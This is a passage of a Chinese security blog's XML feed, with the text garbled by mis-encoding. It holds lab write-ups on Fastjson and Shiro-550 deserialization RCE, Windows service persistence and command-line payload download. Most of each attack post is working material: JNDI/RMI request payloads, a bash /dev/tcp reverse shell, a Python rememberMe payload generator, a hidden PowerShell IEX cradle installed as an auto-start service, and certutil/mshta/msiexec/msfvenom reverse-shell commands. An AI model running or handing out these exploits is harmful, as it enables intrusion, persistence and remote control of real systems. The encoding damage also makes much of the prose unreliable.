        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>lrzsz</tag>
        <tag>xshell</tag>
        <tag>æ–‡ä»¶ä¼ è¾“</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fastjsonååºåˆ—åŒ–]]></title>
    <url>%2Fposts%2F21856%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹fastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚å¯ä»¥é€šè¿‡ååºåˆ—åŒ–å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ æ¼æ´æ£€æµ‹æ–¹æ³•DNSLogå›æ˜¾ä¸‹é¢æœ‰å¤šä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«æ”¾åˆ°è¯·æ±‚æ•°æ®åŒ…éƒ¨åˆ†(å¯èƒ½æŸä¸ªä¸é€‚ç”¨, å¤šè¯•å‡ ä¸ª)ï¼Œé€šè¿‡æ„é€ DNSè§£ææ¥åˆ¤æ–­æ˜¯å¦æ˜¯Fastjsonï¼ŒFastjsonåœ¨è§£æä¸‹é¢è¿™äº›Payloadæ—¶ä¼šå–è§£ævalçš„å€¼ï¼Œä»è€Œå¯ä»¥åœ¨dnslogæ¥æ”¶åˆ°å›æ˜¾ï¼Œä»¥æ­¤åˆ¤æ–­æ˜¯ä¸æ˜¯Fastjson {"a":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}} {"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"} {"@type":"java.net.Inet6Address","val":"xxx.dnslog.cn"} {"@type":"java.net.InetSocketAddress"{"address":,"val":"xxx.dnslog.cn"}} {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"xxx.dnslog.cn"}}""} {{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:"aaa"} Set[{"@type":"java.net.URL","val":"xxx.dnslog.cn"}] Set[{"@type":"java.net.URL","val":"xxx.dnslog.cn"} {{"@type":"java.net.URL","val":"xxx.dnslog.cn"}:0 å¢åŠ keyJavaè¯­è¨€ä¸­å¸¸ç”¨çš„Jsonå¤„ç†ä¸»è¦æ˜¯Fastjsonå’ŒJacksonï¼Œç›¸å¯¹è€Œè¨€ï¼ŒJacksonæ¯”è¾ƒä¸¥æ ¼ï¼Œå¼ºåˆ¶Keyå’ŒJavaBeanå±æ€§å¯¹é½ï¼Œåªèƒ½å°‘Keyä¸èƒ½å¤šKeyï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å¢åŠ ä¸€ä¸ªKeyçœ‹å“åº”åŒ…ä¼šä¸ä¼šæŠ¥é”™æ¥åˆ¤æ–­ã€‚ åˆ©ç”¨å¤ç°è¿™é‡Œç”¨çš„dockerç¯å¢ƒ 1.æŸ¥çœ‹æ•°æ®åŒ…ï¼Œå¯ä»¥ç”¨ä¸Šé¢çš„æ¼æ´æ£€æµ‹çš„æ–¹æ³•æ¥åˆ¤æ–­ 2.vpsç”¨ncç›‘å¬ç«¯å£8888 nc -lvvp 8888 EXPåœ°å€ï¼šhttps://github.com/CaijiOrz/fastjson-1.2.47-RCE 3.ä¿®æ”¹expä¸­åå¼¹shellçš„æœåŠ¡å™¨åœ°å€å’Œä¸ºæˆ‘ä»¬çš„ 4.ä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œç„¶åä¼šç”Ÿæˆä¸€ä¸ªExploit.classæ–‡ä»¶ javac Exploit.java 5.åœ¨Exploit.classçš„ç›®å½•ä¸‹å¼€å¯pythonçš„ç®€å•httpæœåŠ¡ï¼Œç›¸å½“äºè®¿é—®å°±èƒ½ä¸‹è½½ python -m SimpleHTTPServer 8080 6.æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å¼€å¯RMI/LDAPæœåŠ¡ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.43.102:8080/#Exploit" 9999 #8080æ˜¯å‰é¢SimpleHTTPServerçš„ç«¯å£ 7.æ„é€ expè¯·æ±‚åŒ… # 1.2.47ä»¥ä¸‹ç‰ˆæœ¬ { "a":{ "@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl" }, "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://192.168.43.102:9999/Exploit", "autoCommit":true } } # 1.2.24ä»¥ä¸‹ç‰ˆæœ¬ { "b":{ "@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"rmi://åŒä¸Šç±»æ–‡ä»¶åœ°å€:9999/TouchFile", "autoCommit":true } } 8.æ„é€ å¥½çš„è¯·æ±‚åŒ…å‘é€å¦‚ä¸‹ï¼Œæ³¨æ„ï¼šContent-typeæ ¼å¼è¦jsonï¼Œå¹¶ä¸”æ˜¯postè¯·æ±‚ Content-type: application/json 9.æ¥æ”¶åˆ°åå¼¹å›æ¥çš„shell å‚è€ƒï¼šhttps://www.naraku.cn/posts/86.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>Fastjsonååºåˆ—åŒ–</tag>
        <tag>é¶åœºå®éªŒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shiro rememberMeååºåˆ—åŒ–æ¼æ´(Shiro-550)å¤ç°]]></title>
    <url>%2Fposts%2F40239%2F</url>
    <content type="text"><![CDATA[æ¼æ´åŸç†Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚Payloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼šå‘½ä»¤=&gt;åºåˆ—åŒ–=&gt;AESåŠ å¯†=&gt;base64ç¼–ç =&gt;RememberMe Cookieå€¼åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯AESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†,Payloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ã€‚ å½±å“ç‰ˆæœ¬Apache Shiro &lt; 1.2.4 ç‰¹å¾åˆ¤æ–­è¿”å›åŒ…ä¸­åŒ…å«rememberMe=deleteMeå­—æ®µ æ¼”ç¤º æ–‡ä¸­çš„é…å›¾æœ‰ç‚¹ä¸ä¸€è‡´ï¼Œåˆ«ä»‹æ„ï¼Œç¯å¢ƒé—®é¢˜ ç³»ç»Ÿç•Œé¢å¦‚å›¾ æŠ“åŒ…æŸ¥çœ‹å¯ä»¥çœ‹åˆ°æ˜¯Shiro 1.æ£€æŸ¥æ˜¯å¦å­˜åœ¨é»˜è®¤çš„keyå·¥å…·é“¾æ¥ï¼šhttps://github.com/insightglacier/Shiro_exploit python shiro_exploit.py -u http://&lt;IP>:7080 æ£€æµ‹çš„keyä¿å­˜ä¸‹æ¥ä¸€ä¼šç”¨ 2.åˆ¶ä½œåå¼¹shellä»£ç 2.1 vpsç›‘å¬ç«¯å£ nc -lvvp 7788 2.2 Java Runtime é…åˆ bash ç¼–ç ï¼Œåœ¨çº¿ç¼–ç åœ°å€ï¼šhttp://www.jackson-t.ca/runtime-exec-payloads.html bash -i >&amp; /dev/tcp/202.xx.xx.xx/7788 0>&amp;1 # ipä¸ºæ”»å‡»æœºçš„åœ°å€ 3.é€šè¿‡ysoserialä¸­JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬6666ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤ä¸Šä¸€æ­¥çš„åå¼¹shellçš„å‘½ä»¤ç¼–ç ç»“æœå†™åˆ°ä¸‹é¢ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 'bash -c {echo,YmFzaCAtxxxxxxzYuxxxxxxxxxxxxQ==}|{base64,-d}|{bash,-i}' # è¿™é‡Œç”¨çš„CommonsCollections4 4.ä½¿ç”¨shiro.py ç”ŸæˆPayloadpython shiro.py 122.xx.xx.xx:6666 å…¶ä¸­shiro.pyä»£ç å¦‚ä¸‹ï¼š import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'CommonsCollections6', command], stdout=subprocess.PIPE) # è¿™é‡Œè¦æ³¨æ„ç”¨å“ªä¸ªJRMPClient BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode("fCq+/xW488hMTCD+cmJ3aQ==") # è¿™é‡Œçš„keyè¦æå‰æšä¸¾å‡ºæ¥ iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ == '__main__': payload = encode_rememberme(sys.argv[1]) print "rememberMe={0}".format(payload.decode()) 5.æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payload. 6.ncç›‘å¬ç«¯å£ï¼ŒshellæˆåŠŸåå¼¹ PSï¼šåæ¥å‘ç°è¿™ä¸ªå¥½ç”¨çš„å·¥å…·ï¼Œä¸€é”®æ£€æµ‹&amp;getshellï¼Œå¥½ç”¨æäº† æˆ‘åº”è¯¥å»å­¦å­¦javaç¼–ç¨‹äº†ï¼Œçœ‹å¤§ä½¬ä»¬å†™çš„å„ç§å·¥å…·ï¼Œç¾¡æ…•æäº† document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>Shiroååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FTPä¸¤ç§æ¨¡å¼]]></title>
    <url>%2Fposts%2F57750%2F</url>
    <content type="text"><![CDATA[ä¸»è¢«åŠ¨æ¨¡å¼ï¼Œé˜è¿°çš„æ˜¯æ•°æ®ä¼ è¾“è¿‡ç¨‹ ä¸»è¢«åŠ¨æ¨¡å¼ï¼Œé€‰æ‹©æƒåœ¨å®¢æˆ·æœºä¸Šï¼ æ‰€è°“ä¸»æˆ–è¢«ï¼Œæ˜¯ç«™åœ¨æœåŠ¡å™¨è§’åº¦è¯´çš„ ä¸»åŠ¨æ¨¡å¼ç«¯å£ï¼š21ç«¯å£(æ§åˆ¶ç«¯å£) + 20ç«¯å£(æ•°æ®ç«¯å£) ä¼ è¾“æ•°æ®çš„æ—¶å€™æœåŠ¡å™¨ä¸»åŠ¨â€“&gt;ä¸»åŠ¨æ¨¡å¼ æœåŠ¡å™¨çš„20ä¸»åŠ¨å‘å®¢æˆ·æœºçš„éšæœºç«¯å£æ‹¨å·ï¼Œå»ºç«‹æ•°æ®é€šé“ æ‰€ä»¥è¯´ï¼Œå¦‚æœå®¢æˆ·æœºå¼€ç€é˜²ç«å¢™ï¼Œä½ ç”¨ä¸»åŠ¨æ¨¡å¼æ˜¯è¿æ¥ä¸ä¸ŠFTPæœåŠ¡å™¨çš„(æœåŠ¡ç«¯è®¿é—®å®¢æˆ·ç«¯çš„â€™éšæœºâ€™ç«¯å£ä¼šè¢«å®¢æˆ·æœºé˜²ç«å¢™æ‹¦æˆª) ä¸»åŠ¨æ¨¡å¼ä¸é€‚åˆå®¢æˆ·æœºå¼€é˜²ç«å¢™æ—¶å€™ä½¿ç”¨ è¢«åŠ¨æ¨¡å¼ç«¯å£ï¼š21ç«¯å£(æ§åˆ¶ç«¯å£) + éšæœºç«¯å£(ä½œä¸ºæ•°æ®ç«¯å£) ä¼ è¾“æ•°æ®çš„æ—¶å€™æœåŠ¡å™¨è¢«åŠ¨â€“&gt;è¢«åŠ¨æ¨¡å¼ å®¢æˆ·æœºä¸»åŠ¨å‘æœåŠ¡å™¨çš„éšæœºç«¯å£æ‹¨å·ï¼Œå»ºç«‹æ•°æ®é€šé“ æ‰€ä»¥è¯´ï¼Œå¦‚æœæœåŠ¡å™¨å¼€ç€é˜²ç«å¢™ï¼Œä½ ç”¨è¢«åŠ¨æ¨¡å¼æ˜¯è¿æ¥ä¸ä¸ŠFTPæœåŠ¡å™¨çš„(å®¢æˆ·æœºè®¿é—®æœåŠ¡å™¨çš„éšæœºç«¯å£ä¼šè¢«æœåŠ¡å™¨é˜²ç«å¢™æ‰€æ‹¦æˆª) è¢«åŠ¨æ¨¡å¼ä¸é€‚åˆæœåŠ¡æœºå¼€é˜²ç«å¢™æ—¶å€™ä½¿ç”¨ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>FTP</category>
      </categories>
      <tags>
        <tag>FTP</tag>
        <tag>æ–‡ä»¶ä¼ è¾“åè®®</tag>
        <tag>ä¸»åŠ¨æ¨¡å¼ è¢«åŠ¨æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows scå‘½ä»¤ä¸æƒé™ç»´æŒ]]></title>
    <url>%2Fposts%2F65109%2F</url>
    <content type="text"><![CDATA[scå‘½ä»¤ç”¨æ¥åˆ›å»ºå’Œåˆ é™¤windowsæœåŠ¡ ä½¿ç”¨SCå‘½ä»¤åˆ›å»ºwindowsæœåŠ¡å‘½ä»¤æ ¼å¼ï¼š sc [servername] create Servicename [Optionname= Optionvalues] # servername å¯é€‰ï¼Œå¯ä»¥ä½¿ç”¨åŒæ–œçº¿ï¼Œå¦‚\\\\myserverï¼Œä¹Ÿå¯ä»¥æ˜¯\\\\192.168.0.1æ¥æ“ä½œè¿œç¨‹è®¡ç®—æœºã€‚å¦‚æœåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šæ“ä½œå°±ä¸ç”¨æ·»åŠ ä»»ä½•å‚æ•°ã€‚ # Servicename åœ¨æ³¨å†Œè¡¨ä¸­ä¸ºservice keyåˆ¶å®šçš„åç§°ã€‚æ³¨æ„è¿™ä¸ªåç§°æ˜¯ä¸åŒäºæ˜¾ç¤ºåç§°çš„ï¼ˆè¿™ä¸ªåç§°å¯ä»¥ç”¨net startå’ŒæœåŠ¡æ§åˆ¶é¢æ¿çœ‹åˆ°ï¼‰ï¼Œè€ŒSCæ˜¯ä½¿ç”¨æœåŠ¡é”®åæ¥é‰´åˆ«æœåŠ¡çš„ã€‚ # Optionname è¿™ä¸ªoptionnameå’Œoptionvalueså‚æ•°å…è®¸ä½ æŒ‡å®šæ“ä½œå‘½ä»¤å‚æ•°çš„åç§°å’Œæ•°å€¼ã€‚æ³¨æ„ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦åœ¨æ“ä½œåç§°å’Œç­‰å·ä¹‹é—´æ˜¯æ²¡æœ‰ç©ºæ ¼çš„ã€‚ å¦‚æœä½ æƒ³è¦çœ‹æ¯ä¸ªå‘½ä»¤çš„å¯ä»¥ç”¨çš„optionvaluesï¼Œä½ å¯ä»¥ä½¿ç”¨sc commandè¿™æ ·çš„æ ¼å¼ã€‚è¿™ä¼šä¸ºä½ æä¾›è¯¦ç»†çš„å¸®åŠ©ã€‚ # Optionvalues ä¸ºoptionnameçš„å‚æ•°çš„åç§°æŒ‡å®šå®ƒçš„æ•°å€¼ã€‚æœ‰æ•ˆæ•°å€¼èŒƒå›´å¸¸å¸¸é™åˆ¶äºå“ªä¸€ä¸ªå‚æ•°çš„optionnameã€‚å¦‚æœè¦åˆ—è¡¨è¯·ç”¨sc commandæ¥è¯¢é—®æ¯ä¸ªå‘½ä»¤ã€‚ ç¤ºä¾‹ï¼š sc create svnservice binpath= "\"D:\Servers\Subversion\bin\svnserve.exe\" --service -r E:\SVN\repository" displayname= "SVNService" depend= Tcpip start= auto æ³¨æ„ï¼š åœ¨option= xxxxxæ ¼å¼ä¸­ï¼Œ=å·å’Œåé¢çš„å†…å®¹ä¸€å®šè¦æœ‰ç©ºæ ¼ï¼Œå¦‚depend= Tcpip å¦‚æœå‘½ä»¤ä¸­çš„éœ€è¦è¿›è¡ŒåŒå¼•å·çš„åµŒå¥—ï¼Œä½¿ç”¨åæ–œæ åŠ å¼•å· \"æ¥è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚ ä½¿ç”¨SCå‘½ä»¤åˆ é™¤windowsæœåŠ¡ä»æ³¨å†Œè¡¨ä¸­åˆ é™¤æœåŠ¡å­é¡¹ã€‚å¦‚æœæœåŠ¡æ­£åœ¨è¿è¡Œæˆ–è€…å¦ä¸€ä¸ªè¿›ç¨‹æœ‰ä¸€ä¸ªè¯¥æœåŠ¡çš„æ‰“å¼€å¥æŸ„ï¼Œé‚£ä¹ˆæ­¤æœåŠ¡å°†æ ‡è®°ä¸ºåˆ é™¤ã€‚ è¯­æ³•ï¼š sc [ServerName] delete [ServiceName] ç¤ºä¾‹ï¼š sc delete svnservice æœåŠ¡è‡ªå¯åŠ¨åé—¨è¿™é‡Œä½¿ç”¨Cobalt Strikeç”Ÿæˆäº†ä¸€ä¸ªpowershellçš„ä¸‹è½½åé—¨çš„payloadï¼ˆèœå•æ ï¼ŒAttacksâ€“&gt;Web Drive -byâ€“&gt;Scaripted Web Deliveryï¼Œç”Ÿæˆpowershellåé—¨ï¼‰ sc create "Name" binpath= "cmd /c start powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\"" sc description Name "Just For Test" # è®¾ç½®æœåŠ¡çš„æè¿°å­—ç¬¦ä¸² sc config Name start= auto # è®¾ç½®è¿™ä¸ªæœåŠ¡ä¸ºè‡ªåŠ¨å¯åŠ¨ net start Name ``# å¯åŠ¨æœåŠ¡ # é‡å¯æœåŠ¡å™¨åï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªshell document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>sc</tag>
        <tag>æ·»åŠ æœåŠ¡</tag>
        <tag>æƒé™ç»´æŒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windowså‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶æ–¹æ³•]]></title>
    <url>%2Fposts%2F54938%2F</url>
    <content type="text"><![CDATA[å½“æˆ‘ä»¬é€šè¿‡Webæ–¹å¼è·å–äº†ä¸€ä¸ªShellï¼Œè€Œç›®æ ‡ä¸»æœºæ˜¯Windowsï¼Œæˆ‘ä»¬ä¸‹é¢åé—¨æ–‡ä»¶åˆ°ç›®æ ‡ä¸»æœºä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼ï¼š è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç„¶åå†æ‰§è¡Œï¼› è¿œç¨‹ä¸‹è½½æ‰§è¡Œï¼Œæ‰§è¡Œè¿‡ç¨‹æ²¡æœ‰äºŒè¿›åˆ¶æ–‡ä»¶è½åœ°ï¼ˆè¿™ç§æ–¹å¼å·²ç„¶æˆä¸ºåé—¨æ–‡ä»¶ä¸‹è½½æ‰§è¡Œçš„é¦–è¦æ–¹å¼ï¼‰ å¸¸è§çš„ä¸‹è½½æ–¹å¼ PowerShell Bitsadmin certutil wget ipc$æ–‡ä»¶å…±äº« FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs 1.Powershellè¿œç¨‹ä¸‹è½½æ–‡ä»¶ä¿å­˜åœ¨æœ¬åœ°ï¼š powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.0.115/payload.txt','payload.exe') è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼š powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))" 2.Bitsadminbitsadminæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å·¥ä½œå’Œç›‘æµ‹å…¶è¿›å±•æƒ…å†µã€‚ bitsadmin /transfer n http://192.168.28.128/imag/evil.txt D:\1.txt 3.certutilç”¨äºå¤‡ä»½è¯ä¹¦æœåŠ¡ï¼Œæ”¯æŒxp-win10ã€‚ç”±äºcertutilä¸‹è½½æ–‡ä»¶éƒ½ä¼šç•™ä¸‹ç¼“å­˜ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½å»ºè®®ä¸‹è½½å®Œæ–‡ä»¶åå¯¹ç¼“å­˜è¿›è¡Œåˆ é™¤ã€‚ æ³¨ï¼šç¼“å­˜ç›®å½•ä¸º%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content #ä¸‹è½½æ–‡ä»¶ certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #åˆ é™¤ç¼“å­˜ certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete 4.wgetWindowsç¯å¢ƒä¸‹ï¼Œå¯ä¸Šä¼ å…å®‰è£…çš„å¯æ‰§è¡Œç¨‹åºwget.exeåˆ°ç›®æ ‡æœºå™¨ï¼Œç„¶åä½¿ç”¨wgetä¸‹è½½æ–‡ä»¶ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://eternallybored.org/misc/wget/ wget -O "evil.txt" http://192.168.28.128/imag/evil.txt 5.ipc$æ–‡ä»¶å…±äº«IPC$(Internet Process Connection)æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œé€šè¿‡æä¾›å¯ä¿¡ä»»çš„ç”¨æˆ·åå’Œå£ä»¤ï¼Œè¿æ¥åŒæ–¹å¯ä»¥å»ºç«‹å®‰å…¨çš„é€šé“å¹¶ä»¥æ­¤é€šé“è¿›è¡ŒåŠ å¯†æ•°æ®çš„äº¤æ¢ï¼Œä»è€Œå®ç°å¯¹è¿œç¨‹è®¡ç®—æœºçš„è®¿é—®ã€‚ #å»ºç«‹è¿œç¨‹IPCè¿æ¥ net use \\192.168.28.128\ipc$ /user:administrator "abc123!" #å¤åˆ¶è¿œç¨‹æ–‡ä»¶åˆ°æœ¬åœ°ä¸»æœº copy \\192.168.28.128\c$\2.txt D:\test 6.FTPä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ä½¿ç”¨FTPä¸Šä¼ æ–‡ä»¶éœ€è¦å¾ˆå¤šäº¤äº’çš„æ­¥éª¤ï¼Œä¸‹é¢è¿™ä¸ª bashè„šæœ¬ï¼Œè€ƒè™‘åˆ°äº†äº¤äº’çš„æƒ…å†µï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå¹¶ä¸ä¼šäº§ç”Ÿäº¤äº’åŠ¨ä½œã€‚ ftp 127.0.0.1 # è¿™é‡Œæ¢æˆæˆ‘ä»¬è£…æœ‰payloadçš„æœåŠ¡å™¨çš„IPåœ°å€ username # è¾“å…¥ç”¨æˆ·å password # å¯†ç  get file # ä¸‹è½½çš„payloadæ–‡ä»¶ exit 7.TFTPç”¨æ¥ä¸‹è½½è¿œç¨‹æ–‡ä»¶çš„æœ€ç®€å•çš„ç½‘ç»œåè®®ï¼Œå®ƒåŸºäºUDPåè®®è€Œå®ç° tftp32æœåŠ¡ç«¯ä¸‹è½½åœ°å€ï¼šhttp://tftpd32.jounin.net/tftpd32_download.html tftp -i &lt;ä½ çš„payloadçš„IP> get &lt;è¦ä¸‹è½½payloadæ–‡ä»¶> &lt;å­˜æ”¾ç›®æ ‡æœºå™¨çš„ç›®å½•ä½ç½®> 8.WinScpWinSCPæ˜¯ä¸€ä¸ªWindowsç¯å¢ƒä¸‹ä½¿ç”¨SSHçš„å¼€æºå›¾å½¢åŒ–SFTPå®¢æˆ·ç«¯ã€‚ #ä¸Šä¼  winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "put D:\1.txt /tmp/" "exit" /log=log_file.txt #ä¸‹è½½ winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://bypass:abc123!@192.168.28.131:22" "option transfer binary" "get /tmp D:\test\app\" "exit" /log=log_file.tx 9.msiexecmsiexec æ”¯æŒè¿œç¨‹ä¸‹è½½åŠŸèƒ½ï¼Œå°†msiæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œé€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿œç¨‹æ‰§è¡Œï¼š #åœ¨æ”»å‡»æœºå™¨ä¸Šç”ŸæˆmsiåŒ… msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi #åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿œç¨‹æ‰§è¡Œï¼ˆç›´æ¥å†™payloadçš„ipå’Œæ–‡ä»¶ï¼‰ msiexec /q /i http://192.168.28.128/evil.msi 10.IEExecIEexec.exeåº”ç”¨ç¨‹åºæ˜¯.NET Frameworké™„å¸¦ç¨‹åºï¼Œå­˜åœ¨äºå¤šä¸ªç³»ç»Ÿç™½åå•å†…ã€‚ å…ˆåœ¨æ”»å‡»æœºç”ŸæˆPayloadï¼š msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe ä½¿ç”¨ç®¡ç†å‘˜èº«ä»½æ‰“å¼€cmdï¼Œåˆ†åˆ«è¿è¡Œä¸‹é¢ä¸¤æ¡å‘½ä»¤ã€‚ C:\Windows\Microsoft.NET\Framework64\v2.0.50727>caspol.exe -s off C:\Windows\Microsoft.NET\Framework64\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe 11.mshtamshtaç”¨äºæ‰§è¡Œ.htaæ–‡ä»¶ï¼Œè€Œhtaæ˜¯HTML Applocationçš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯HTMLåº”ç”¨ç¨‹åºã€‚ è€Œhtaä¸­ä¹Ÿæ”¯æŒVBSã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨htaæ¥ä¸‹è½½æ–‡ä»¶ã€‚ 1.ç”Ÿæˆpayload.hta run.htaå†…å®¹å¦‚ä¸‹ï¼š &lt;HTML> &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"> &lt;HEAD> &lt;script language="VBScript"> Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject("Wscript.Shell") objShell.Run "cmd.exe /c net user test password /add" // è¿™é‡Œå¡«å†™å‘½ä»¤ self.close &lt;/script> &lt;body> demo &lt;/body> &lt;/HEAD> &lt;/HTML> æˆ–è€…å‚è€ƒè¿™ä¸ªæ–‡ç« ç”Ÿæˆhta:https://www.cnblogs.com/backlion/p/10491616.html æ–¹æ³•1ï¼šMSFVenom # å…ˆç”Ÿæˆpayload msfvenom -p windows/meterpreter/reverse_tcp lhost=121.36.37.235 lport=2222 -f hta-psh > shell.hta # msfç›‘å¬ use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 192.168.1.109 set lport 1234 exploit æ–¹æ³•2ï¼šMetasploit use exploit/windows/misc/hta_server msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109 msf exploit(windows/misc/hta_server) > exploit # ç›®æ ‡ä¸Š mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta 2.ç„¶åå†åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œå‰é¢ç”Ÿæˆçš„htaï¼š mshta http://192.168.28.128/run.hta 